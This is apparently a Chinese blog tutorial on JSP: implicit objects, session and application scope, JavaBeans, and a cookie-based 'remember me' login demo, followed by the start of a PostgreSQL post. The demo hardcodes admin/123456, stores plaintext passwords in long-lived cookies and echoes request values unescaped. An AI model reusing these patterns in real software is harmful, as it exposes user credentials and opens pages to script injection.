\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ---- 输出： 账号：123456 密码：123456 属性：欢迎! 协议类型：HTTP/1.1 请求类型：application/x-www-form-urlencoded 请求大小：30 字节 虚拟路径： 请求路径：/doLogin.jsp 真实路径：C:\\Users\\Administrator\\IdeaProjects\\untitled1\\out\\artifacts\\untitled1_war_exploded\\doLogin.jsp 主机名称：localhost 主机端口：8080 客户端 IP 地址：0:0:0:0:0:0:0:1 服务端 IP 地址：0:0:0:0:0:0:0:1 Note： 真实路径：\u0026lt;%=request.getServletContext().getRealPath(\u0026#34;doLogin.jsp\u0026#34;)%\u0026gt;\u0026lt;br\u0026gt; 等同于 真实路径：\u0026lt;%=request.getServletContext().getRealPath(request.getServletPath())%\u0026gt;\u0026lt;br\u0026gt; 等同于 真实路径：\u0026lt;%=application.getRealPath(request.getServletPath())%\u0026gt;\u0026lt;br\u0026gt; response \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% response.setContentType(\u0026#34;text/html;charset=UTF-8\u0026#34;); 与 page 指令中的 contentType 属性作用相同 response.sendRedirect(\u0026#34;request.jsp\u0026#34;); 请求重定向（response） request.getRequestDispatcher(\u0026#34;request.jsp\u0026#34;).forward(request, response); 请求转发（request） 等同于 \u0026lt;jsp:forward page=\u0026#34;request.jsp\u0026#34;/\u0026gt; JSP 动作：forward 动作 forward 可添加参数： \u0026lt;jsp:forward page=\u0026#34;a.jsp\u0026#34;\u0026gt; \u0026lt;jsp:param name=\u0026#34;age\u0026#34; value=\u0026#34;25\u0026#34;/\u0026gt; 添加参数 \u0026lt;jsp:param name=\u0026#34;sex\u0026#34; value=\u0026#34;男\u0026#34;/\u0026gt; \u0026lt;/jsp:forward\u0026gt; 转发后的页面接收参数： \u0026lt;%=request.getParameter(\u0026#34;age\u0026#34;)%\u0026gt;\u0026lt;br\u0026gt; %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Note： 请求重定向（客户端行为）（共发起 2 次请求）（游览器地址会改变）（不传递原有请求对象）（response）（302 临时跳转） 请求转发一（服务端行为）（共发起 1 次请求）（游览器地址不改变）（会传递原有请求对象）（request） session index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.text.SimpleDateFormat\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Date\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Enumeration\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% session.setAttribute(\u0026#34;username\u0026#34;, \u0026#34;admin\u0026#34;); session.setAttribute(\u0026#34;password\u0026#34;, \u0026#34;123456\u0026#34;); session.setAttribute(\u0026#34;age\u0026#34;, 20); session.setMaxInactiveInterval(3600); 设置生存间隔时间（秒） %\u0026gt; Session ID：\u0026lt;%=session.getId()%\u0026gt;\u0026lt;br\u0026gt; Session 一一创建时间：\u0026lt;%=a(session.getCreationTime())%\u0026gt;\u0026lt;br\u0026gt; Session 最近请求时间：\u0026lt;%=a(session.getLastAccessedTime())%\u0026gt;\u0026lt;br\u0026gt; Session 生存间隔时间：\u0026lt;%=session.getMaxInactiveInterval()%\u0026gt; 秒\u0026lt;br\u0026gt; Session 中保存的属性：\u0026lt;% Enumeration\u0026lt;String\u0026gt; attributeNames = session.getAttributeNames(); StringBuilder s = new StringBuilder(); while (attributeNames.hasMoreElements()) { String k = attributeNames.nextElement(); Object v = session.getAttribute(k); s.append(k).append(\u0026#39;=\u0026#39;).append(v.toString()).append(\u0026#34;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026#34;); } out.print(s.toString()); %\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;%! private SimpleDateFormat dateFormat = new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); private String a(long i) { return dateFormat.format(new Date(i)); } %\u0026gt; ---- 输出： Session ID：C9E1EDACE8806D15DA4BE0354BBD75E8 Session 一一创建时间：2017-03-11 20:37:55 Session 最近请求时间：2017-03-11 20:43:09 Session 生存间隔时间：3600 秒 Session 中保存的属性：password=123456 age=20 username=admin Note： Session 生命周期 ---- 1. 创建 首次访问（无 JSESSIONID Cookie）：发送 Cookie:JSESSIONID=4619A7A93D0DA9622F3FB06F93E2A328 2. 活动 重置 Session 生存间隔时间。 3. 销毁 主动：session.invalidate()、重启 Tomcat、重启浏览器（JSESSIONID Cookie 失效，导致 Session 过期）。 被动：Session 过期。 设置 Session 超时时间（默认 30 分钟） ---- session.setMaxInactiveInterval(1800); 秒 D:\\Download\\apache-tomcat-9.0.0\\conf\\web.xml（全局） ⇳ \u0026lt;session-config\u0026gt; \u0026lt;session-timeout\u0026gt;30\u0026lt;/session-timeout\u0026gt; 分 \u0026lt;/session-config\u0026gt; application application 对象类似于 Java 中的 static 成员，属于 Web APP，由所有用户共享，可用于存放全局变量。 application 对象始于服务器，终于服务器。 ---- \u0026lt;% application.setAttribute(\u0026#34;str\u0026#34;, \u0026#34;ABC\u0026#34;); application.getAttribute(\u0026#34;str\u0026#34;); Enumeration\u0026lt;String\u0026gt; attributeNames = application.getAttributeNames(); while (attributeNames.hasMoreElements()) { String k = attributeNames.nextElement(); Object v = application.getAttribute(k); out.print(k + \u0026#34; = \u0026#34; + v + \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;); } %\u0026gt; \u0026lt;%=application.getRealPath(request.getServletPath())%\u0026gt;\u0026lt;br\u0026gt; \u0026lt;%=application.getServerInfo()%\u0026gt;\u0026lt;br\u0026gt; ---- 输出： C:\\Users\\Administrator\\IdeaProjects\\untitled\\out\\artifacts\\untitled_war_exploded\\index.jsp Apache Tomcat/9.0.0.M18 page page 对象类似于 Java 中的 this 指针，指代当前 JSP 页面本身，是 java.lang.Object 的实例。 ---- \u0026lt;%=page%\u0026gt; ---- 输出： org.apache.jsp.index_jsp@2445d4f1 pageContext pageContext 对象提供了对 JSP 页面内所有的命名空间的访问，相当于页面中所有功能的集大成者。 ---- pageContext.forward(\u0026#34;a.jsp\u0026#34;); 请求转发 pageContext.include(\u0026#34;a.jsp\u0026#34;); 使当前位置包含另一个页面的内容（类似 include 动作，生成独立的 Servlet） config \u0026lt;% StringBuilder s = new StringBuilder(); Enumeration\u0026lt;String\u0026gt; initParameterNames = config.getInitParameterNames(); while (initParameterNames.hasMoreElements()) { String k = initParameterNames.nextElement(); String v = config.getInitParameter(k); s.append(k).append(\u0026#34; = \u0026#34;).append(v).append(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); } out.print(s.toString()); %\u0026gt; ---- 输出： fork = false trimSpaces = true classdebuginfo = true xpoweredBy = false exception index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; errorPage=\u0026#34;a.jsp\u0026#34; %\u0026gt; 指定异常处理页面 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% int i = 100 / 0; 将产生运行时异常 %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; a.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; isErrorPage=\u0026#34;true\u0026#34; %\u0026gt; 设置为异常处理页面（可以使用 exception 对象） \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Exception\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;%=exception.toString()%\u0026gt;\u0026lt;br\u0026gt; 输出异常信息 \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录页面\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录页面\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;form action=\u0026#34;doLogin.jsp\u0026#34; name=\u0026#34;loginForm\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;账号：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;account\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;密码：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;reset\u0026#34; value=\u0026#34;重置\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; doLogin.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); 指定输入字符集 String account = request.getParameter(\u0026#34;account\u0026#34;); String password = request.getParameter(\u0026#34;password\u0026#34;); if (\u0026#34;admin\u0026#34;.equals(account) \u0026amp;\u0026amp; \u0026#34;123456\u0026#34;.equals(password)) { request.getRequestDispatcher(\u0026#34;login_successful.jsp\u0026#34;).forward(request, response); 登录成功：请求转发 } else { response.sendRedirect(\u0026#34;login_failed.jsp\u0026#34;); 登录失败：请求重定向 } %\u0026gt; login_successful.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录成功\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录成功\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; 欢迎用户：\u0026lt;%=request.getParameter(\u0026#34;account\u0026#34;)%\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; login_failed.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录失败\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录失败\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a href=\u0026#34;index.jsp\u0026#34;\u0026gt;返回登录页面\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; JavaBean 符合某种设计规范的类，用于封装业务数据和业务逻辑，减少代码冗余，提高代码的可维护性。\nUserBean package a; public class User { 公有类 private String username; 私有属性 private String password; public User() { 公有的无参构造方法 } public String getUsername() { 公有 get/set return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;username=\u0026#39;\u0026#34; + username + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, password=\u0026#39;\u0026#34; + password + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } JSP 动作：useBean、set（get）Property \u0026lt;%@ page import=\u0026#34;a.User\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; 普通方式 ---- \u0026lt;% User a = new User(); a.setUsername(\u0026#34;admin\u0026#34;); a.setPassword(\u0026#34;123456\u0026#34;); %\u0026gt; 账户：\u0026lt;%=a.getUsername()%\u0026gt;\u0026lt;br\u0026gt; 密码：\u0026lt;%=a.getPassword()%\u0026gt;\u0026lt;br\u0026gt; 使用 JSP 动作 ---- useBean \u0026lt;jsp:useBean id=\u0026#34;b\u0026#34; class=\u0026#34;a.User\u0026#34; scope=\u0026#34;page\u0026#34;/\u0026gt; 在指定范围内实例化 JavaBean（默认范围为 page） setProperty \u0026lt;jsp:setProperty name=\u0026#34;b\u0026#34; property=\u0026#34;*\u0026#34;/\u0026gt; 根据表单自动匹配所有属性（跟表单关联） \u0026lt;jsp:setProperty name=\u0026#34;b\u0026#34; property=\u0026#34;username\u0026#34;/\u0026gt; 根据表单手动匹配部分属性（跟表单关联） \u0026lt;jsp:setProperty name=\u0026#34;b\u0026#34; property=\u0026#34;password\u0026#34;/\u0026gt; \u0026lt;jsp:setProperty name=\u0026#34;b\u0026#34; property=\u0026#34;username\u0026#34; value=\u0026#34;admin\u0026#34;/\u0026gt; 手动设置属性值 \u0026lt;jsp:setProperty name=\u0026#34;b\u0026#34; property=\u0026#34;password\u0026#34; value=\u0026#34;123456\u0026#34;/\u0026gt; \u0026lt;jsp:setProperty name=\u0026#34;b\u0026#34; property=\u0026#34;username\u0026#34; param=\u0026#34;abc\u0026#34;/\u0026gt; 根据 URL 参数给属性赋值 \u0026lt;jsp:setProperty name=\u0026#34;b\u0026#34; property=\u0026#34;password\u0026#34; param=\u0026#34;def\u0026#34;/\u0026gt; \u0026lt;!--http://localhost:8080/index.jsp?abc=123\u0026amp;def=456--\u0026gt; getProperty 账户：\u0026lt;jsp:getProperty name=\u0026#34;b\u0026#34; property=\u0026#34;username\u0026#34;/\u0026gt;\u0026lt;br\u0026gt; 密码：\u0026lt;jsp:getProperty name=\u0026#34;b\u0026#34; property=\u0026#34;password\u0026#34;/\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; useBean 作用域范围 ---- 作用于单个页面的生命周期：page 作用于单个请求的生命周期：request 作用于整个会话的生命周期：session 作用于整个应用的生命周期：application https://tomcat.apache.org/tomcat-9.0-doc/jspapi/javax/servlet/jsp/PageContext.html#PAGE_SCOPE https://tomcat.apache.org/tomcat-9.0-doc/jspapi/javax/servlet/jsp/JspContext.html#setAttribute-java.lang.String-java.lang.Object-int- User.java 用封装业务数据 ---- package a; public class User { private String username; private String password; public User() { } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;username=\u0026#39;\u0026#34; + username + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, password=\u0026#39;\u0026#34; + password + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } UserDAO.java 用于封装业务逻辑 ---- package a; public class UserDAO { public boolean userLogin(User user) { return \u0026#34;admin\u0026#34;.equals(user.getUsername()) \u0026amp;\u0026amp; \u0026#34;123456\u0026#34;.equals(user.getPassword()); } } index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录页面\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录页面\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;form action=\u0026#34;doLogin.jsp\u0026#34; name=\u0026#34;loginForm\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;账号：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;密码：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;reset\u0026#34; value=\u0026#34;重置\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; doLogin.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;jsp:useBean id=\u0026#34;userDAO\u0026#34; class=\u0026#34;a.UserDAO\u0026#34;/\u0026gt; 默认生命周期为 page \u0026lt;jsp:useBean id=\u0026#34;loginUser\u0026#34; class=\u0026#34;a.User\u0026#34; scope=\u0026#34;session\u0026#34;/\u0026gt; 指定生命周期为 session \u0026lt;jsp:setProperty name=\u0026#34;loginUser\u0026#34; property=\u0026#34;*\u0026#34;/\u0026gt; 根据表单自动匹配所有属性 \u0026lt;% request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); 指定输入字符集 if (userDAO.userLogin(loginUser)) { request.getRequestDispatcher(\u0026#34;login_successful.jsp\u0026#34;).forward(request, response); 登录成功：请求转发 } else { response.sendRedirect(\u0026#34;login_failed.jsp\u0026#34;); 登录失败：请求重定向 } %\u0026gt; login_successful.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;jsp:useBean id=\u0026#34;loginUser\u0026#34; class=\u0026#34;a.User\u0026#34; scope=\u0026#34;session\u0026#34;/\u0026gt; 在整个 Session 中只有同一个 loginUser \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录成功\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录成功\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; 欢迎用户：\u0026lt;%=loginUser.getUsername()%\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; login_failed.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录失败\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录失败\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;返回登录页面\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Cookie index.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% String username = \u0026#34;\u0026#34;; String password = \u0026#34;\u0026#34;; Cookie[] cookies = request.getCookies(); if (cookies != null \u0026amp;\u0026amp; cookies.length \u0026gt; 0) { for (Cookie c : cookies) { if (c.getName().equals(\u0026#34;username\u0026#34;)) { username = c.getValue(); } if (c.getName().equals(\u0026#34;password\u0026#34;)) { password = c.getValue(); } } } %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录页面\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录页面\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;form action=\u0026#34;doLogin.jsp\u0026#34; name=\u0026#34;loginForm\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;账号：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;\u0026lt;%=username%\u0026gt;\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;密码：\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#34;\u0026lt;%=password%\u0026gt;\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;checkbox\u0026#34; name=\u0026#34;isUseCookie\u0026#34; checked\u0026gt;记住登录状态\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;reset\u0026#34; value=\u0026#34;重置\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;登录\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; doLogin.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;jsp:useBean id=\u0026#34;userDAO\u0026#34; class=\u0026#34;a.UserDAO\u0026#34;/\u0026gt; \u0026lt;jsp:useBean id=\u0026#34;loginUser\u0026#34; class=\u0026#34;a.User\u0026#34; scope=\u0026#34;session\u0026#34;/\u0026gt; \u0026lt;jsp:setProperty name=\u0026#34;loginUser\u0026#34; property=\u0026#34;*\u0026#34;/\u0026gt; \u0026lt;% request.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); if (userDAO.userLogin(loginUser)) { request.getRequestDispatcher(\u0026#34;login_successful.jsp\u0026#34;).forward(request, response); } else { response.sendRedirect(\u0026#34;login_failed.jsp\u0026#34;); } %\u0026gt; login_successful.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;jsp:useBean id=\u0026#34;loginUser\u0026#34; class=\u0026#34;a.User\u0026#34; scope=\u0026#34;session\u0026#34;/\u0026gt; \u0026lt;% String isUseCookie = request.getParameter(\u0026#34;isUseCookie\u0026#34;); if (isUseCookie != null) { Cookie username = new Cookie(\u0026#34;username\u0026#34;, loginUser.getUsername()); 创建 Cookie password = new Cookie(\u0026#34;password\u0026#34;, loginUser.getPassword()); username.setMaxAge(86400); 设置 Cookie 有效期为 1 天（单位：秒）（若未设置，默认为浏览会话结束时过期） password.setMaxAge(86400); response.addCookie(username); 写入 response.addCookie(password); } else { Cookie[] cookies = request.getCookies(); 读取 if (cookies != null \u0026amp;\u0026amp; cookies.length \u0026gt; 0) { for (Cookie c : cookies) { if (c.getName().equals(\u0026#34;username\u0026#34;) || c.getName().equals(\u0026#34;password\u0026#34;)) { c.setMaxAge(0); 设置 Cookie 立即过期 response.addCookie(c); 写入 } } } } %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录成功\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录成功\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a href=\u0026#34;user.jsp\u0026#34;\u0026gt;查看用户信息\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; login_failed.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% Cookie[] cookies = request.getCookies(); if (cookies != null \u0026amp;\u0026amp; cookies.length \u0026gt; 0) { for (Cookie c : cookies) { if (c.getName().equals(\u0026#34;username\u0026#34;) || c.getName().equals(\u0026#34;password\u0026#34;)) { c.setMaxAge(0); response.addCookie(c); } } } %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;登录失败\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;登录失败\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;返回登录页面\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; user.jsp ---- \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% String username = \u0026#34;\u0026#34;; String password = \u0026#34;\u0026#34;; Cookie[] cookies = request.getCookies(); if (cookies != null \u0026amp;\u0026amp; cookies.length \u0026gt; 0) { for (Cookie c : cookies) { if (c.getName().equals(\u0026#34;username\u0026#34;)) { username = c.getValue(); } if (c.getName().equals(\u0026#34;password\u0026#34;)) { password = c.getValue(); } } } %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;用户信息\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;用户信息\u0026lt;/h1\u0026gt; \u0026lt;hr\u0026gt; 账户：\u0026lt;%=username%\u0026gt;\u0026lt;br\u0026gt; 密码：\u0026lt;%=password%\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Cookie 与 Session 的对比 Session Cookie 保存位置 服务端 客户端 保存类型 Object 类 String 类 保存数据 保存 重要 的数据 保存 不重要 的数据 保存时间 随 会话结束 而结束 可以 长期 保存至客户端 \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; ","permalink":"https://xhstormr.github.io/blog/posts/jsp/","summary":"","title":"Java Server Pages"},{"content":"Updated on 2017-02-19\nhttps://www.postgresql.org/\nhttps://jdbc.postgresql.org/download.html\nhttps://www.postgresql.org/docs/current/index.html\nhttps://github.com/pgjdbc/pgjdbc\nhttps://github.com/postgis/postgis\nhttps://github.com/postgres/postgres\nhttps://jcenter.bintray.com/org/postgresql/postgresql/\nhttps://yum.postgresql.org/repopackages.php\nStep 1 | Step 2 | Step 3\nConcept 结构化查询语言（SQL）：Structured Query Language 数据定义语言（DDL）：Data Definition Language 用于建立（CREATE）、修改（ALTER）、删除（DROP）数据库对象。 数据操纵语言（DML）：Data Manipulation Language 用于改变（INSERT、UPDATE、DELETE）数据库数据。 数据查询语言（DQL）：Data Query Language 用于查询（SELECT）所需要的数据。 数据控制语言（DCL）：Data Control Language 用于权限的授予（GRANT）和收回（REVOKE），创建用户（CREATE USER）。 事务控制语言（TCL）：Transaction Control Language 用于维护数据一致性的语句，包括提交（COMMIT）、回滚（ROLLBACK）、保存点（SAVEPOINT）。 增删改查（CRUD）： SQL；HTTP 增加（Create）：INSERT；POST（非幂等） 查询（Retrieve）：SELECT；GET 修改（Update）：UPDATE；PATCH（更新资源：非幂等），PUT（替换资源：幂等） 删除（Delete）：DELETE；DELETE 事务（Transaction）：逻辑上的 一组操作，这组操作只能一起成功或者一起失败。 数据库中 保证事务可靠 的机制（ACID）。 原子性（Atomicity）：对于数据修改，要么全都执行，要么全都不执行。 一致性（Consistency）：所有的数据都保持一致状态。 隔离性（Isolation）：与其它并发事务所作的修改隔离。 持久性（Durability）：对于系统的影响是永久性的。 数据访问对象（DAO）：Data Access Object 